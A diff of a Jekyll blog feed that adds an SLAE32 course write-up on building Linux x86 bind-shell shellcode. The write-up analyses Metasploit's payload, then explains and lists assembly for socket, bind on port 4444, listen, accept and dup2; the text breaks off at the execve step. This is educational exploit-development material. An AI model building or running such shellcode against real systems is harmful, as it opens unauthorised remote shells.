@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-09-24T16:27:48+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jeremy Catelain</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">ze</title><link href="http://localhost:4000/2022/09/14/welcome-to-jekyll.html" rel="alternate" type="text/html" title="ze" /><published>2022-09-14T08:45:58+02:00</published><updated>2022-09-14T08:45:58+02:00</updated><id>http://localhost:4000/2022/09/14/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/2022/09/14/welcome-to-jekyll.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-09-25T14:11:56+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jeremy Catelain</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">ze</title><link href="http://localhost:4000/2022/09/14/welcome-to-jekyll.html" rel="alternate" type="text/html" title="ze" /><published>2022-09-14T08:45:58+02:00</published><updated>2022-09-14T08:45:58+02:00</updated><id>http://localhost:4000/2022/09/14/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/2022/09/14/welcome-to-jekyll.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
 
 &lt;p&gt;Jekyll requires blog post files to be named according to the following format:&lt;/p&gt;
 
@@ -30,20 +30,423 @@
 &lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Tom&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints &apos;Hi, Tom&apos; to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="SLAE32$" /><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/09/14/Bind.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-09-14T08:45:58+02:00</published><updated>2022-09-14T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/09/14/Bind</id><content type="html" xml:base="http://localhost:4000/slae32/2022/09/14/Bind.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="SLAE32$" /><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/09/14/Bind.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-09-14T08:45:58+02:00</published><updated>2022-09-14T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/09/14/Bind</id><content type="html" xml:base="http://localhost:4000/slae32/2022/09/14/Bind.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;
 
-&lt;p&gt;Jekyll requires blog post files to be named according to the following format:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Create a Shell_Bind_TCP Shellcode:
+    &lt;ul&gt;
+      &lt;li&gt;Binds to a port;&lt;/li&gt;
+      &lt;li&gt;Execs Shell on incoming connection;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Port should be easily configurable.&lt;/li&gt;
+&lt;/ul&gt;
 
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR-MONTH-DAY-title.MARKUP&lt;/code&gt;&lt;/p&gt;
+&lt;!--more--&gt;
 
-&lt;p&gt;Where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR&lt;/code&gt; is a four-digit number, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MONTH&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DAY&lt;/code&gt; are both two-digit numbers, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MARKUP&lt;/code&gt; is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+&lt;h3 id=&quot;-msfvenom-example--socket_call-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; MSFVenom example &amp;amp; Socket_call &lt;/span&gt;&lt;/h3&gt;
 
-&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+&lt;p&gt;To perform this exercise, we started by analysing the bind shell code of Metasploit to see how it works and what syscall are made. To do so, we followed the steps as follows to create an image of the different syscalls performed and to make it more visible.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Tom&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints &apos;Hi, Tom&apos; to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;p&gt;As follows the command lines to generate the graphical schema of the metasploit bind shell :&lt;/p&gt;
 
-&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="SLAE32" /><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry></feed>
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    msfvenom -p linux/x86/shell_bind_tcp R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000 -G shell_bind_tcp.dot
+    //Then convert into PNG file :
+    dot shell_bind_tcp.dot -Tpng -o shell_bin_tcp.png 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment1/shell_bin_tcp.png&quot; alt=&quot;drawing&quot; style=&quot;max-width:100%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we can see, there are 6 syscalls performed : socket, bind, listen, accept, dup2, execve&lt;/p&gt;
+
+&lt;p&gt;Each of them will be detailled in the following section.&lt;/p&gt;
+
+&lt;h3 id=&quot;-socketcall-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Socketcall &lt;/span&gt;&lt;/h3&gt;
+
+&lt;p&gt;The first thing that we identified in the first syscall is the EAX value set to 0x66 (102 in decimal) related as we can see below to the “socketcall” syscall.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    root@kali:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 102
+    #define __NR_socketcall 102
+    #define __NR_socket 359
+    #define __NR_socketpair 360
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then we look into more details about that syscall:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    man 2 socketcall
+    int socketcall(int call, unsigned long *args);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The socketcall is composed of two parameters:&lt;/p&gt;
+
+&lt;p&gt;1) int call - Type of the syscall (socket, bind, …)&lt;/p&gt;
+
+&lt;p&gt;2) unsigned long* args - Arguments of the desired syscall&lt;/p&gt;
+
+&lt;h3 id=&quot;-socket-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Socket &lt;/span&gt;&lt;/h3&gt;
+
+&lt;p&gt;The socket syscall creates a socket which will listen to the incoming connections.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man 2 socket 
+int socket(int domain, int type, int protocol)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The syscall is composed of the following parameters:&lt;/p&gt;
+
+&lt;p&gt;1) int domain - The protocol family used (AF_INET, AF_LOCAL, …)&lt;/p&gt;
+
+&lt;p&gt;2) int type - The type of the service (TCP, UDP, …)&lt;/p&gt;
+
+&lt;p&gt;3) int protocol - Specify if a particular protocol will be used with the socket (0 most of the time)&lt;/p&gt;
+
+&lt;p&gt;Note: More details can be find on the possible parameter values in the following paths:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;/usr/include/x86_64-linux-gnu/bits/socket.h (DOMAIN AND PROTOCOLS parameters)&lt;/li&gt;
+  &lt;li&gt;/usr/include/x86_64-linux-gnu/bits/socket_type.h (TYPE parameter)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So, we want to set the following parameters:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;EAX = 0x66 (socketcall syscall)&lt;/li&gt;
+  &lt;li&gt;EBX = 0x1 (SOCKET syscall)&lt;/li&gt;
+  &lt;li&gt;ECX (Address pointing to the arguments into the stack):
+    &lt;ul&gt;
+      &lt;li&gt;ECX[0] = 0x2 (PF_INET/AF_INET, IP protocol family)&lt;/li&gt;
+      &lt;li&gt;ECX[1] = 0x1 (SOCK_STREAM, TCP connection based)&lt;/li&gt;
+      &lt;li&gt;ECX[2] = 0x0 (Unspecified)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;After that the syscall is performed with success, the file descriptor returned will be stored in the EAX register.&lt;/p&gt;
+
+&lt;p&gt;Useful link : The details of the &lt;em&gt;socket&lt;/em&gt; can be find in the following links :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://shtroumbiniouf.free.fr/CoursInfo/Reseau2/Cours/SocketsBSD/SocketsBSD.html&quot; style=&quot;color:#2d8fb3;&quot;&gt;shtroumbiniouf.free.fr (French link)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://sdz.tdct.org/sdz/les-sockets.html&quot; style=&quot;color:#2d8fb3;&quot;&gt;sdz.tdct.org (French link)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Assembly Code:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    ; EBX
+    xor ebx, ebx
+    push ebx ; push the x00000000 on the stack
+    inc ebx ; SYS_SOCKET call 1 for socket
+    push ebx ; push the 0x00000001 on the stack for the domain AF_INET of the SYS_SOCKET call 
+    ; ECX
+    push byte 0x2 ; push the 0x00000002 on the stack for the type SOCK_STREAM
+    mov ecx, esp ; put the arguments of the socketcall into ECX
+    ; EAX
+    xor eax, eax
+    mov al, 0x66
+    ; socket call
+    int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;-bind-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Bind &lt;/span&gt;&lt;/h3&gt;
+
+&lt;p&gt;After the creation of the socket we need to bind it to an address.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    man 2 bind 
+    int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With:&lt;/p&gt;
+
+&lt;p&gt;1) sockfd : File descriptor, return value of the socket syscall&lt;/p&gt;
+
+&lt;p&gt;2) sockaddr *addr : address argument which depends on the family&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    struct sockaddr {
+        sa_family_t sa_family;
+        char        sa_data[14];
+    }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In our case, with the Internet Family AF_INET, the address structure will be constructed as follows :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    struct sockaddr_in {
+        sa_family_t    sin_family; /* address family: AF_INET */
+        in_port_t      sin_port;   /* port in network byte order */
+        struct in_addr sin_addr;   /* internet address */
+    };
+
+    /* Internet address. */
+    struct in_addr {
+        uint32_t       s_addr;     /* address in network byte order */
+    };
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note: From “/usr/src/linux-headers-5.2.0-kali2-common/include/uapi/linux/in.h”&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;addrlen : The size, in bytes, of the address structure pointed to by addr&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Useful Link:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://man7.org/linux/man-pages/man7/ip.7.html&quot; style=&quot;color:#2d8fb3;&quot;&gt;man7.org (IP manual)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.scip.ch/en/?labs.20200521&quot; style=&quot;color:#2d8fb3;&quot;&gt;www.scip.ch (Example)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This means that we need to pass the following registers:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;EAX = 0x66 (SOCKET_CALL)&lt;/li&gt;
+  &lt;li&gt;EBX = 0x2 (SYS_BIND)&lt;/li&gt;
+  &lt;li&gt;ECX (Address pointing to the arguments into the stack):
+    &lt;ul&gt;
+      &lt;li&gt;ECX[0] = File descriptor (Return value of the socket syscall)&lt;/li&gt;
+      &lt;li&gt;ECX[1] (Address pointing to arguments into the stack):
+        &lt;ul&gt;
+          &lt;li&gt;ECX[1.0] = 0x2 (AF_INET)&lt;/li&gt;
+          &lt;li&gt;ECX[1.1] = 0x115c (port 4444 in hexa)&lt;/li&gt;
+          &lt;li&gt;ECX[1.2] = 0x00000000 (IP : 0.0.0.0)&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;ECX[2] = 0x10 (16 bytes)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The return value stored in EAX should be 0x00 in case of success!&lt;/p&gt;
+
+&lt;p&gt;Note that if we want to set up another IP such as 127.0.0.1, you need to convert each value in hexadecimal and push them in reverse into the stack.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python hex(value)
+Result : 
+    127 : 0x7f
+    0   : 0x00
+    0   : 0x00
+    1   : 0x1
+Then push then into the stack in reverse order (0x0100007f).
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Assembly Code:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    ; EBX - SYS_SOCKET call 2 for bind
+    pop ebx 
+    ; ECX
+    ; Creation of the struct sockaddr_in
+    xor edi, edi
+    push edi ; Push on the stack the IP address 0.0.0.0
+    push word 0x5c11 ; Push on the stack the port 4444 TO MODIFY IF NEEDED
+    push bx ; Push the Family AF_INET = 2
+    mov ecx, esp ; mov the structure into ecx
+    ; Put all parameters into ECX
+    push byte 0x10 ; Push on the stack the address length of 16
+    push ecx ; 
+    push eax ; push the file descriptor
+    mov ecx, esp ; Move the stack into ECX
+    ; EAX
+    xor eax, eax
+    mov al, 0x66
+    ; bind call
+    int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;-listen-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Listen &lt;/span&gt;&lt;/h3&gt;
+
+&lt;p&gt;After that the socket has been binded, we need to listen to this socket. Listen() marks the socket referred by the sockfr as a passive socket, a socket that will be used to accept incoming connection requests using accept().&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    man 2 listen
+    int listen(int sockfd, int backlog)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The syscall is composed of the following arguments:&lt;/p&gt;
+
+&lt;p&gt;1) int sockfd : File descriptor&lt;/p&gt;
+
+&lt;p&gt;2) int backlog : Argument defining the maximum length to which the queue of pending connections for sockfr may grow&lt;/p&gt;
+
+&lt;p&gt;Then we will pass the following arguments :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;EAX = 0x66 (SOCKET_CALL)&lt;/li&gt;
+  &lt;li&gt;EBX = 0x4 (SYS_LISTEN)&lt;/li&gt;
+  &lt;li&gt;ECX (Address pointing to the arguments into the stack):
+    &lt;ul&gt;
+      &lt;li&gt;ECX[0] = sockfd (file descriptor which is the return value of the socket)&lt;/li&gt;
+      &lt;li&gt;ECX[1] = 0x0 (no need of backlog)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The return value stored in EAX must be 0x00 in case of success.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Assembly Code:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    pop esi ; Retrieve the file descriptor
+    ; EAX &amp;amp; ECX backlog
+    push edi ; Push on the stack 0 for the backlog 
+    xor eax, eax
+    mov al, 0x66 ; Set up EAX
+    ; EBX, 4 for listen 
+    mov bl, 0x4
+    ; ECX 
+    push esi
+    mov ecx, esp
+    ; SYS CALL LISTEN
+    int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;-accept-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Accept &lt;/span&gt;&lt;/h3&gt;
+
+&lt;p&gt;Then, when there is an incoming connection to the socket, we need to accept that connection with the accept() function.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    man 2 accept
+    int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The syscall is composed of the following arguments:&lt;/p&gt;
+
+&lt;p&gt;1) int sockfd : File descriptor&lt;/p&gt;
+
+&lt;p&gt;2) struct sockaddr *addr : Pointer to the remote address&lt;/p&gt;
+
+&lt;p&gt;3) socklen_t *addrlen : Pointer to the address length&lt;/p&gt;
+
+&lt;p&gt;Then, we will pass the following arguments :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;EAX = 0x66 (SOCKET_CALL)&lt;/li&gt;
+  &lt;li&gt;EBX : 0x5 (SYS_ACCEPT)&lt;/li&gt;
+  &lt;li&gt;ECX :
+    &lt;ul&gt;
+      &lt;li&gt;ECX[0] = sockfd (file descriptor which is the return value of the socket call)&lt;/li&gt;
+      &lt;li&gt;ECX[1] = 0x00000000 (Address of the peer socket)&lt;/li&gt;
+      &lt;li&gt;ECX[2] = 0x00000000 (NULL because the address is NULL)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;On success, the system call will return in the EAX register a file descriptor for the accepted socket.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Assembly Code:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    ; EAX
+    mov al, 0x66
+    ; EBX 
+    inc ebx 	; 5 for the ACCEPT SYS CALL
+    ; ECX
+    push edi	; NULL - address of the peer 
+    push edi	; NULL 	
+    push esi	; file descriptor
+    mov ecx, esp
+    int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;-dup2-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Dup2 &lt;/span&gt;&lt;/h3&gt;
+
+&lt;p&gt;The next step is to redirect the STDIN, STDOUT and STDER to the socket session. The dup2() system call allocate a new file descriptor that refers to the same open file description as the descriptor oldfd. The file descriptor newfd is ajusted so that it refers to the same open file desdcription as oldfd.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    root@kali:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep dup2
+        #define __NR_dup2 63
+
+    man 2 dup2
+    int dup2(int oldfd, int newfd)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The function is composed of:&lt;/p&gt;
+
+&lt;p&gt;1) int oldfd : File descriptor returned by the accept syscall&lt;/p&gt;
+
+&lt;p&gt;2) int newfd : File descriptor that we want to refer to&lt;/p&gt;
+
+&lt;p&gt;We will pass the following arguments :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;EAX : 0x3f (dup syscall, 63 in decimal)&lt;/li&gt;
+  &lt;li&gt;EBX : Previous EAX (File descriptor returned by the accept call)&lt;/li&gt;
+  &lt;li&gt;ECX : 0x2 to 0x0 (loop IN, OUT, ERR)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;To perform the loop, we will use the intruction “JNS rel8” because it perform the jmp until the Sign Flag is set (SF=1), which mean that the zero is taken into account in the loop :&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Assembly Code:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        ; EBX, File descriptor return by ACCEPT call
+        mov ebx, eax	; Retrieve the file descriptor
+
+        ; EAX, dup2 sys call 0x3f
+        xor eax, eax
+
+        ; initialize ECX 
+        xor ecx, ecx
+        mov cl, 0x2
+
+        ; LOOP
+
+    DupLoop :
+ 
+        mov al, 0x3f
+        int 0x80
+        dec ecx
+        jns DupLoop	
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;-execve-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Execve &lt;/span&gt;&lt;/h3&gt;
+
+&lt;p&gt;Now that we created a socket which is listening and accepting the connections, we will create the part of the code which will launch the execve syscall when someone is connecting to it.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    man 2 Execve
+    int execve(const char *pathname, char *const argv[], char *const envp[])
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The arguments are:&lt;/p&gt;
+
+&lt;p&gt;1) const char *pathname: Pointer to the filename&lt;/p&gt;
+
+&lt;p&gt;2) char *const argv[]: Pointer to the argument of the function&lt;/p&gt;
+
+&lt;p&gt;3) char *const envp[]: Array of pointers to strings passed as environment of the new program&lt;/p&gt;
+
+&lt;p&gt;We will pass the following arguments :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;EAX : 0xb (execve sys call, 11 in decimal)&lt;/li&gt;
+  &lt;li&gt;EBX : Pointer to /bin//sh + 0X00000000&lt;/li&gt;
+  &lt;li&gt;ECX : Pointer to the address of EBX&lt;/li&gt;
+  &lt;li&gt;EDX : NULL&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;To pass the argument /bin/sh, we first converted it in hexadecimal and then reverse it.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Assembly Code:&lt;/strong&gt;&lt;/p&gt;
+
